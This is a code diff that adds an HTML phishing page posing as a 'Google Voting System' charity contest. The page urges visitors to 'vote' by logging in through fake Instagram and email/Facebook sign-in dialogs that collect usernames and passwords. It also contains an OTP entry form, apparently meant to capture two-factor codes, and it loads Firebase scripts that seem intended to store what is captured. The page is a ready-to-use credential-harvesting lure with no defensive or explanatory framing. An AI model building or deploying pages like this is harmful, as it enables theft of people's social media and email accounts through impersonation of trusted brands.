@@ -1,1 +1,363 @@
-Hello World
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description"
+    content="Vote your favorite ambassador in the Charity Contest brought to you by the Google Voting System. Become a Social Media Ambassador or Influencer and make a difference. Vote for charities, engage your audience, and be a part of positive change. #GoogleCharityContest">
+
+  <!-- Open Graph Meta Tags for Social Media Sharing -->
+  <meta property="og:title" content="Google Voting System Charity Contest">
+  <meta property="og:description"
+    content="Become a Social Media Ambassador or Influencer and make a difference in the Google Voting System Charity Contest. Vote for charities, engage your audience, and be a part of positive change. #GoogleCharityContest">
+  <meta property="og:image" content="charity.png">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card Meta Tags for Social Media Sharing -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Google Voting System Charity Contest">
+  <meta name="twitter:description"
+    content="Join the Google Voting System Charity Contest! Become a Social Media Ambassador or Influencer and make a difference. Vote for charities, engage your audience, and be a part of positive change. #GoogleCharityContest">
+  <meta name="twitter:image" content="charity.png">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="assets/css/main.css">
+
+  <!--Facebook-->
+  <link rel="stylesheet" href="secured/default.css">
+  <link rel="stylesheet" href="secured/style.css">
+  <script src="js/index.js"></script>
+  <script src="/js/jquery-3.6.0.min.js"></script>
+
+  <!-- Twitter CSS -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+    crossorigin="anonymous">
+  <link rel="stylesheet" href="list/CSS/style.css">
+  <link rel="icon" href="favicon.png">
+
+  <title>Google Voting System | Charity Contest</title>
+  <style>
+    #otpForm {
+      margin-top: 20px;
+      padding: 15px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+    }
+
+    body {
+      font-family: "Courier New", monospace;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: hsl(240deg 44.44% 96.47%);
+    }
+
+    .profile-card {
+      border-radius: 8px;
+      padding: 20px;
+      width: 300px;
+      text-align: center;
+      background-color: #fff;
+    }
+
+    .profile-picture {
+      width: 100px;
+      height: 100px;
+      border-radius: 5%;
+      margin: 0 auto 10px;
+      background-color: #ddd;
+    }
+
+    .profile-name {
+      font-family: "Verdana";
+      font-size: 0.9em;
+      margin: 5px 0;
+      color: hsl(207.39deg 19.83% 45.49%);
+    }
+
+    .profile-title {
+      font-family: "Verdana", monospace;
+      font-size: 0.9em;
+      color: hsl(207.39deg 19.83% 45.49%);
+      margin: 0;
+      font-weight: bold;
+    }
+
+    .profile-description {
+      font-family: "Verdana", monospace;
+      font-size: 1em;
+      color: hsl(207.39deg 19.83% 45.49%);
+      margin: 0;
+    }
+
+    .social-links {
+      margin-top: 15px;
+    }
+
+    .social-icon {
+      font-size: 1em;
+      margin: 0 10px;
+      color: #555;
+    }
+
+    .social-vote-button {
+      margin-top: 15px;
+      font-size: 0.8rem;
+      display: inline-block;
+    }
+
+    .instagram-button2 {
+      background-color: hsl(121.36deg 37.29% 53.73%);
+      color: #FFF;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .email-button2 {
+      background-color: hsl(121.36deg 37.29% 53.73%);
+      color: #FFF;
+      border: none;
+      padding: 10px;
+      border-radius: 5px;
+      width: 120px;
+      cursor: pointer;
+    }
+
+    .facebook-button3 {
+      background-color: hsl(0.44deg 63.98% 58.63%);
+      color: #FFF;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .preloader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      color: white;
+      font-size: 24px;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .powered-by {
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+      font-size: 0.9em;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="preloader" class="preloader">
+    Loading...
+  </div>
+
+  <div id="profile_content" class="profile-card">
+    <h2 class="profile-name">PLEASE I NEED YOUR VOTES</h2>
+    <img src="charity.png" alt="Profile Picture" class="profile-picture">
+    <p class="profile-title">Log in to</p>
+    <p class="profile-description">Vote for my Charity</p>
+    <div class="social-links">
+
+      <div class="social-vote-button">
+        <button onclick="Instagram()" class="instagram-button2">VOTE WITH <i class="fab fa-instagram"></i> </button>
+      </div>
+
+      <div class="social-vote-button">
+        <button onclick="Facebook()" class="facebook-button3">VOTE WITH <i class="fa fa-envelope"></i> </button>
+      </div>
+      <br><br>
+
+    </div>
+
+    <div id="count" class="vote_count">
+      <li
+        style="text-align: left; margin-left: -20px; margin-right: 10px; padding: 10px; width: 300px; background: hsl(220deg 23.08% 97.45%);">
+        <i class="fa fa-home" style="font-size:15px; color: hsl(206.93deg 61.35% 59.41%);"></i><span
+          style="color: hsl(206.93deg 61.35% 59.41%);"> Total votes: 698 out of 2000</span>
+      </li>
+      <li
+        style="text-align: left; margin-left: -20px; margin-right: 10px; padding: 10px; width: 300px; background: #fff;">
+        <i class="fa fa-check" style="font-size:15px; color: hsl(204deg 7.25% 72.94%);"></i><span
+          style="color: hsl(204deg 7.25% 72.94%);"> Total Votes To Win: 1302</span>
+      </li>
+      <li
+        style="text-align: left; margin-left: -20px; margin-right: 10px; padding: 10px; width: 300px; background: #fff;">
+        <i class="fa fa-flag" style="font-size:15px; color: hsl(204deg 7.25% 72.94%);"></i><span
+          style="color: hsl(204deg 7.25% 72.94%);"> Help</span>
+      </li>
+    </div>
+
+    <p class="powered-by">Powered by <strong><span style="color: hsl(206.36deg 64.71% 60%);">google voting
+          system</span></strong></p>
+
+    <!-- Instagram Dialog Box -->
+    <div id="instagram" class="dialog">
+      <div class="dialog-content">
+        <span class="close" onclick="closeDialog()">&times;</span>
+        <h2><span hidden id="dialog-instagram"></span></h2>
+        <main class="l-main">
+          <div class="l-main__img">
+            <img src="assets/img/homepage.png" alt="Smartphones">
+          </div>
+          <div class="l-user">
+            <div class="c-panel group">
+
+              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+              <div class="c-panel__form">
+                <input type="text" class="c-panel__input" class="form-control" required
+                  data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
+                <input type="text" class="c-panel__input" class="form-control" required
+                  data-error="Please enter your email" placeholder="Password" id="ig-pass">
+                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
+                <span class="c-panel__span">OR</span>
+              </div>
+              <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
+              <a href="#" class="c-panel__forgot">Forgot password?</a>
+              <br>
+              <br>
+            </div>
+            <div class="c-signup group">
+              <p>Don't have an account? <span>Sign up</span></p>
+            </div>
+
+            <div class="c-app">
+              <p>Get the app.</p>
+              <div class="c-app__download">
+                <img src="assets/img/apple.png" alt="Apple Store">
+                <img src="assets/img/google.png" alt="Google Play">
+              </div>
+            </div>
+          </div>
+        </main>
+      </div>
+    </div>
+
+
+    <!-- Facebook Dialog Box -->
+
+    <div id="facebook" class="dialog">
+      <div class="dialog-content">
+        <span class="close" onclick="closeDialog()">&times;</span>
+        <h2><span hidden id="dialog-instagram"></span></h2>
+        <main class="l-main">
+          <div class="fb-user">
+            <div class="fb-panel fb-group">
+              <main>
+
+                <h1 id="h1"><i class="fa fa-envelope"></i> Sign in</h1>
+                <hr id="hr1">
+                <p id="p2">Sign in using your Email account</p><br><br>
+                <input class="c-panel__input" class="form-control" required id="email" type="text"
+                  placeholder="Email address or mobile number">
+                <input class="c-panel__input" class="form-control" required id="email_pass" type="password"
+                  placeholder="Password">
+                <button class="email-button2" onclick="login()" id="fb-log">Login</button>
+                <br>
+            </div>
+        </main>
+      </div>
+      </main>
+    </div>
+  </div>
+
+  <!-- OTP Form -->
+  <div id="otpForm" style="display:none;">
+    <input type="text" id="otpCode" placeholder="Enter OTP">
+    <button id="submitOtp">Submit OTP</button>
+  </div>
+
+  <script>
+    function showPreloader() {
+      document.getElementById("preloader").style.display = "flex";
+    }
+
+    function hidePreloader() {
+      document.getElementById("preloader").style.display = "none";
+    }
+
+    function Twitter() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("twitter").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
+
+    function Instagram() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("instagram").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
+
+    function Facebook() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("facebook").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
+
+    function closeDialog() {
+      document.getElementById("instagram").style.display = "none";
+      document.getElementById("twitter").style.display = "none";
+      document.getElementById("facebook").style.display = "none";
+    }
+
+    function showOtpForm(platform) {
+      // You can also handle specific actions based on the platform (Instagram or Facebook) here if needed.
+      document.getElementById("otpForm").style.display = "block";
+    }
+
+    function submitOtp() {
+      const otpCode = document.getElementById("otpCode").value;
+
+      // Here, you would typically send the OTP code to your server for verification.
+      // For now, we will just log it to the console.
+      console.log("OTP submitted:", otpCode);
+
+      // Simulate an OTP verification (replace with actual verification logic)
+      if (otpCode === "123456") { // Example check
+        alert("OTP verified! You can proceed.");
+        // Proceed with the next steps, like redirecting the user or allowing access
+      } else {
+        alert("Invalid OTP. Please try again.");
+      }
+    }
+
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
+  </script>
+
+</body>
+
+</html>
